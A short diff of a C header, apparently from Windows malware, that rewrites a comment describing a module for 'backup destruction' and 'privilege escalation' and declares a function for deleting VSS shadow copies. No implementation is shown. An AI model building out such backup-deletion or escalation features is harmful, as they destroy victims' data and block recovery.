@@ -4,10 +4,10 @@
 #include <windows.h>
 #include <stdbool.h>
 
-/* ============================================================
- * UTILITIES MODULE
- * Backup destruction, privilege escalation, and misc tasks
- * ============================================================ */
+/*
+UTILITIES Engine
+this does Backup destruction, privilege escalation, and misc tasks
+ */
 
 /* VSS/Shadow Copy Deletion */
 bool UtilsNukeBackups(void);
